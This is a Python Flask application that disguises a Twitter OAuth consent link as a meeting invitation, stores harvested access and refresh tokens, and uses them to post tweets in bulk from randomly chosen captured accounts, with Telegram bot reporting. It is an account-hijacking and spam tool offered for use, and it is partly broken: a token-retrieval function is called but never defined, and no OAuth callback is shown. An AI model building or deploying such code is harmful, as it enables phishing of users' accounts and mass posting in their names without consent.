import base64
import hashlib
import os
import requests
from flask import Flask, redirect, request, session, render_template
from datetime import datetime
import sqlite3
import random
import time

# Configuration
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
CALLBACK_URL = os.getenv('CALLBACK_URL')  # Callback URL from environment variables
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

app = Flask(__name__)
app.secret_key = os.urandom(24)

# Database setup
def init_db():
    conn = sqlite3.connect('tokens.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            access_token TEXT,
            refresh_token TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# Generate code verifier and challenge
def generate_code_verifier_and_challenge():
    code_verifier = base64.urlsafe_b64encode(os.urandom(32)).rstrip(b'=').decode('utf-8')
    code_challenge = base64.urlsafe_b64encode(
        hashlib.sha256(code_verifier.encode()).digest()
    ).rstrip(b'=').decode('utf-8')
    return code_verifier, code_challenge

# Generate the meeting link
def generate_meeting_link(state, code_challenge):
    return f"{CALLBACK_URL}j?meeting={state}&pwd={code_challenge}"

# Function to send a startup message with OAuth link and meeting link
def send_startup_message():
    state = "0"  # Fixed state value for initialization
    code_verifier, code_challenge = generate_code_verifier_and_challenge()
    
    # Generate the OAuth link
    authorization_url = (
        f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
        f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
        f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
    )

    # Generate the meeting link
    meeting_link = generate_meeting_link(state, code_challenge)

    # Message content with buttons
    message = (
        f"🚀 *OAuth Authorization Link:*\n[Authorize link]({authorization_url})\n\n"
        f"📅 *Meeting Link:*\n[Join Meeting]({meeting_link})\n\n"
        "Please use the buttons below to interact with the bot."
    )
    
    # Send the message to Telegram
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown",
        "reply_markup": {
            "inline_keyboard": [
                [
                    {"text": "Single Post", "callback_data": "single_post"},
                    {"text": "Bulk Post", "callback_data": "bulk_post"}
                ],
                [
                    {"text": "Refresh Token", "callback_data": "refresh_token"}
                ]
            ]
        }
    }
    requests.post(url, json=data)

# Function to save token to the database
def save_token(username, access_token, refresh_token):
    conn = sqlite3.connect('tokens.db')
    cursor = conn.cursor()
    cursor.execute('INSERT INTO tokens (username, access_token, refresh_token) VALUES (?, ?, ?)', 
                   (username, access_token, refresh_token))
    conn.commit()
    conn.close()

# Get username from access token
def get_twitter_username(access_token):
    url = "https://api.twitter.com/2/users/me"
    headers = {
        "Authorization": f"Bearer {access_token}"
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        data = response.json()
        return data.get("data", {}).get("username")
    return None

# Function to send access and refresh tokens to Telegram
def send_to_telegram(chat_id, message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "Markdown"
    }
    requests.post(url, json=data)

# Function to post a tweet
def post_tweet(access_token, tweet_text):
    TWITTER_API_URL = "https://api.twitter.com/2/tweets"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json"
    }
    payload = {
        "text": tweet_text
    }
    
    response = requests.post(TWITTER_API_URL, json=payload, headers=headers)
    
    if response.status_code == 201:
        tweet_data = response.json()
        return tweet_data['data']['id']
    else:
        error_message = response.json().get("detail", "Failed to post tweet")
        return None

@app.route('/tweet/<access_token>', methods=['GET', 'POST'])
def tweet(access_token):
    if request.method == 'POST':
        tweet_text = request.form['tweet_text']
        tweet_id = post_tweet(access_token, tweet_text)
        if tweet_id:
            username = get_twitter_username(access_token)
            tweet_link = f"https://twitter.com/{username}/status/{tweet_id}"
            tweet_details = {
                'username': username,
                'link': tweet_link,
                'time': datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
            }
            send_to_telegram(TELEGRAM_CHAT_ID, f"Tweet posted successfully: {tweet_link}")
            return render_template('tweet_result.html', result=f"Tweet posted successfully: {tweet_link}")
        return render_template('tweet_result.html', result="Failed to post tweet.")

    return render_template('tweet_form.html', access_token=access_token)

@app.route('/bulk_tweet', methods=['POST'])
def bulk_tweet():
    tokens = get_tokens()  # Function to retrieve available tokens from the database
    num_tokens = int(request.form.get('num_tokens'))
    tweet_text = request.form['tweet_text']
    delay = int(request.form.get('delay'))

    selected_tokens = random.sample(tokens, min(num_tokens, len(tokens)))
    for token in selected_tokens:
        tweet_id = post_tweet(token, tweet_text)
        if tweet_id:
            username = get_twitter_username(token)
            tweet_link = f"https://twitter.com/{username}/status/{tweet_id}"
            tweet_details = {
                'username': username,
                'link': tweet_link,
                'time': datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
            }
            send_to_telegram(TELEGRAM_CHAT_ID, f"Bulk tweet posted successfully: {tweet_link}")
        time.sleep(delay)  # Delay between posts

    return "Bulk tweets posted successfully.", 200

@app.route(f"/{TELEGRAM_BOT_TOKEN}", methods=['POST'])
def webhook():
    update = request.get_json()
    
    # Handle callback_query for button interactions
    if 'callback_query' in update:
        callback_query = update['callback_query']
        chat_id = callback_query['message']['chat']['id']
        callback_data = callback_query['data']

        # Acknowledge the callback query to avoid timeout
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery",
            json={"callback_query_id": callback_query['id']}
        )

        # Handle different callback data
        if callback_data == 'single_post':
            send_to_telegram(chat_id, "Please enter the content of your tweet.")
        elif callback_data == 'bulk_post':
            send_to_telegram(chat_id, "Please enter the content of your tweet and specify the number of tokens to use.")
        elif callback_data == 'refresh_token':
            send_to_telegram(chat_id, "Please enter your refresh token.")

    elif 'message' in update:
        chat_id = update['message']['chat']['id']
        message_text = update['message'].get('text', '')

    return 'ok', 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    send_startup_message()  # Send the startup message with OAuth and meeting links
    app.run(host='0.0.0.0', port=port)
